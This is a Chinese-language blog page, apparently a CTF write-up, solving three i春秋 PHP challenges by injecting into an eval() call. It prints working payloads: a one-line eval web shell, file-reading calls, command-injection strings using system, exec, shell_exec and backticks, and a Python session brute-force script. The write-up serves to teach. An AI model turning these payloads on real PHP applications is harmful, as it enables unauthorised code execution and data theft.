@@ -1,0 +1,286 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>i春秋:MiscWeb-爆破 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="爆破-1题目内容flag在6位变量中
+&amp;lt;?php
+include &#34;flag.php&#34;;
+$a = @$_REQUEST[&#39;hello&#39;];//以get或post传入hello，并赋值给`$a,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">i春秋:MiscWeb-爆破</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">i春秋:MiscWeb-爆破</h1>
+        <div class="stuff">
+            <span>四月 07, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/i%E6%98%A5%E7%A7%8B/" rel="tag">i春秋</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h2><h4 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h4><p>flag在6位变量中</p>
+<pre><code>&lt;?php
+include "flag.php";
+$a = @$_REQUEST['hello'];//以get或post传入hello，并赋值给`$a`
+if(!preg_match('/^\w*$/',$a )){//正则表达式^匹配一行的开头，$表示结束。\w表示匹配包括下划线的任何单词字符，等价于'[A-Za-z0-9_]'。*号：匹配前面的子表达式零次或多次。
+  die('ERROR');
+}
+eval("var_dump($$a);");
+show_source(__FILE__);//__FILE__当前运行文件的完整路径和文件名。
+?&gt;</code></pre>
+<p>1、如果匹配正则表达式/^\w*$/，就打印变量 $$a<br>2、$a是hello，$$a是六位变量$hello<br>接下来不会了，所以百度一下<br>发现超全局变量$GLOBALS<br>作用：<br>引用全局作用域中可用的全部变量。这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。<br>3、所以在URL后加?hello=GLOBALS，将参数hello修改为Globals实际执行语句：</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$a);"</span><span class="token punctuation">)</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($hello);"</span><span class="token punctuation">)</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($GLOBALS);"</span><span class="token punctuation">)</span></code></pre>
+<p>得到flag</p>
+<h2 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h2><h4 id="题目内容-1"><a href="#题目内容-1" class="headerlink" title="题目内容"></a>题目内容</h4><p>flag不在变量中</p>
+<h4 id="法一：蚁剑连接"><a href="#法一：蚁剑连接" class="headerlink" title="法一：蚁剑连接"></a>法一：蚁剑连接</h4><pre><code>?hello=${@eval($_POST[1])</code></pre>
+<p>访问flag.php</p>
+<h4 id="法二：利用文件系统函数"><a href="#法二：利用文件系统函数" class="headerlink" title="法二：利用文件系统函数"></a>法二：利用文件系统函数</h4><h5 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.file.php"><code>file()</code></a> 函数用于将整个文件读入数组中。</p>
+<p>尝试构造 payload </p>
+<pre><code>?hello=file("flag.php")</code></pre>
+<p>提交后直接看到 flag，证明推测正确</p>
+<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=file(flag.php).png" alt="hello=file(flag.php)"></p>
+<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.file-get-contents.php"><code>file_get_contents()</code></a> 函数用于将整个文件读入到一个字符串中。</p>
+<p>尝试构造 payload</p>
+<pre><code>?hello=file_get_contents("flag.php")</code></pre>
+<p>提交后竟未显示 flag？这是因为 flag.php 文件中的内容以界定符 <code>&lt;?php</code> 开头，所以输出到浏览器时，该字符串被当做 PHP 脚本不予显示。但不必担心，右击页面空白处，查看网页源代码，即可看到 flag：</p>
+<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=file_get_contents(flag.php).png" alt="hello=file_get_contents(flag.php)"></p>
+<h5 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.show-source.php"><code>show_source()</code></a> 函数等同于 <a target="_blank" rel="noopener" href="http://php.net/manual/en/function.highlight-file.php"><code>highlight_file()</code></a> 函数，可将一个 PHP 脚本文件语法高亮。</p>
+<p>尝试构造 payload </p>
+<pre><code>?hello=show_source("flag.php")</code></pre>
+<p>提交后能看到语法高亮后的 flag：</p>
+<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=show_source(flag.php).png" alt="hello=show_source(flag.php)"></p>
+<h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.readfile.php"><code>readfile()</code></a> 函数用于读取一个文件并写入到输出缓冲区。</p>
+<p>在提交 payload </p>
+<pre><code>?hello=readfile("flag.php")</code></pre>
+<p> 在网页源代码处可看到 flag</p>
+<h5 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.fread.php"><code>fread()</code></a> 函数用于读取二进制文件，不过首先得用 <a target="_blank" rel="noopener" href="http://php.net/manual/en/function.fopen.php"><code>fopen()</code></a> 函数创建文件句柄，填入第一个参数，并在第二个参数中填入可读取的最大字节数。</p>
+<p>因此，构造 payload </p>
+<pre><code>?hello=fread(fopen("flag.php","r"),100)</code></pre>
+<p>在网页源代码处可看到 flag</p>
+<h4 id="法三：利用命令执行函数"><a href="#法三：利用命令执行函数" class="headerlink" title="法三：利用命令执行函数"></a>法三：利用命令执行函数</h4><p>利用 PHP 中的<a target="_blank" rel="noopener" href="http://php.net/manual/en/ref.exec.php">命令执行函数</a>，通过执行系统命令以显示文件内容。</p>
+<p>首先，由预定义常量 <a target="_blank" rel="noopener" href="http://php.net/manual/en/reserved.constants.php"><code>PHP_OS</code></a> 可知后台操作系统的类型，构造 </p>
+<pre><code>?hello=PHP_OS</code></pre>
+<p> 提交后，发现是 Linux 操作系统：</p>
+<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=PHP_OS.png" alt="hello=PHP_OS"></p>
+<h5 id="执行运算符"><a href="#执行运算符" class="headerlink" title="执行运算符"></a>执行运算符</h5><p>PHP 的<a target="_blank" rel="noopener" href="http://php.net/manual/en/language.operators.execution.php">执行运算符</a>为反引号「`」，可将反引号之间的内容作为 shell 命令执行，并返回所有执行结果。</p>
+<p>在构造 payload 之前，需要做两件事：</p>
+<ul>
+<li>闭合前面的 <code>var_dump(</code> 字符串。</li>
+<li>注释后面的 <code>);</code> 字符串。</li>
+</ul>
+<p>因此，构造 payload </p>
+<pre><code>hello=);echo `cat flag.php`;//</code></pre>
+<p>在网页源代码处即可看到 flag</p>
+<h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.system.php"><code>system()</code></a> 函数用于执行外部程序，输出执行结果，并返回结果的最后一行。</p>
+<p>因此，在提交 payload </p>
+<pre><code>hello=);echo system("cat flag.php");//</code></pre>
+<p>在网页源代码处可看到两个 flag，是因为第一个 flag 是由输出结果而得，第二个 flag 是由返回值而得</p>
+<h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.exec.php"><code>exec()</code></a> 函数用于执行一个外部程序，并返回结果的最后一行。</p>
+<p>因此，在提交 payload </p>
+<pre><code>hello=);echo exec("cat flag.php");//</code></pre>
+<p>可见 flag，因此 flag 正好是 flag.php 文件中的最后一行：</p>
+<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.shell-exec.php"><code>shell_exec()</code></a> 函数可通过 shell 环境执行命令，并返回所有执行结果，本函数功能与执行运算符相同。</p>
+<p>因此，构造 payload </p>
+<pre><code>hello=);echo shell_exec("cat flag.php");//</code></pre>
+<p>在网页源代码处即可看到 flag</p>
+<h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.passthru.php"><code>passthru()</code></a> 函数用于执行外部函数，并输出原始执行结果，没有返回值。</p>
+<p>因此，构造 payload </p>
+<pre><code>hello=);echo passthru("cat flag.php");//</code></pre>
+<p>在网页源代码处即可看到 flag</p>
+<h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.popen.php"><code>popen()</code></a> 函数用于创建指向命令执行进程的文件句柄，与 <code>fopen()</code> 函数类似，最后将通过 <code>fread()</code> 函数读取命令执行的结果。</p>
+<p>因此，构造 payload </p>
+<p>hello=);echo fread(popen(“cat flag.php”,”r”),100);//</p>
+<p>在网页源代码处即可看到 flag：</p>
+<h2 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h2><pre><code>&lt;?php 
+error_reporting(0);
+session_start();
+require('./flag.php');
+if(!isset($_SESSION['nums'])){
+  $_SESSION['nums'] = 0;
+  $_SESSION['time'] = time();
+  $_SESSION['whoami'] = 'ea';
+}
+if($_SESSION['time']+120&lt;time()){
+  session_destroy();
+}
+$value = $_REQUEST['value'];
+$str_rand = range('a', 'z');
+$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];
+if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0){
+  $_SESSION['nums']++;
+  $_SESSION['whoami'] = $str_rands;
+  echo $str_rands;
+}
+if($_SESSION['nums']&gt;=10){
+  echo $flag;
+}
+show_source(__FILE__);
+?&gt;</code></pre>
+<h4 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h4><p>这个真的是爆破。</p>
+<h4 id="审计代码："><a href="#审计代码：" class="headerlink" title="审计代码："></a>审计代码：</h4><p>1、Session中的num初始值为0，time为当前时间，whoami初始值为ea。<br>2、120秒之后会话结束。然后str_rands随机生成2个字母。<br>3、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++。<br>4、whoami=str_rands，循环10次后，输出flag。</p>
+<p>所以只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag。</p>
+<pre><code>import requests
+
+url = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=ea"
+al = ['abcdefghijklmnopqrstuvwxyz']
+s = requests.session()
+r=s.get(url)
+
+for i in range(20):
+    url = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=" + r.content[0:2]
+    r=s.get(url)
+    print r.content</code></pre>
+<p>或者：</p>
+<p>?value[0]=e&amp;value[1]=a</p>
+<p>会返回两个字符 假设是bq   那就  ?value[0]=b&amp;value[1]=q  代码主要是要验证这两个字符MD5的第五还是第六位是不是字符（弱类型可以过”==”号）或 0，写脚本的话注意session开启和重置</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-1"><span class="toc-number">1.</span> <span class="toc-text">爆破-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%86%85%E5%AE%B9"><span class="toc-number">1.0.1.</span> <span class="toc-text">题目内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-2"><span class="toc-number">2.</span> <span class="toc-text">爆破-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%86%85%E5%AE%B9-1"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.0.2.</span> <span class="toc-text">法一：蚁剑连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.3.</span> <span class="toc-text">法二：利用文件系统函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">file()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#file-get-contents"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-source"><span class="toc-number">2.0.3.3.</span> <span class="toc-text">show_source()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#readfile"><span class="toc-number">2.0.3.4.</span> <span class="toc-text">readfile()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fread"><span class="toc-number">2.0.3.5.</span> <span class="toc-text">fread()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.4.</span> <span class="toc-text">法三：利用命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.0.4.1.</span> <span class="toc-text">执行运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#system"><span class="toc-number">2.0.4.2.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exec"><span class="toc-number">2.0.4.3.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shell-exec"><span class="toc-number">2.0.4.4.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#passthru"><span class="toc-number">2.0.4.5.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#popen"><span class="toc-number">2.0.4.6.</span> <span class="toc-text">popen()</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-3"><span class="toc-number">3.</span> <span class="toc-text">爆破-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">3.0.2.</span> <span class="toc-text">审计代码：</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
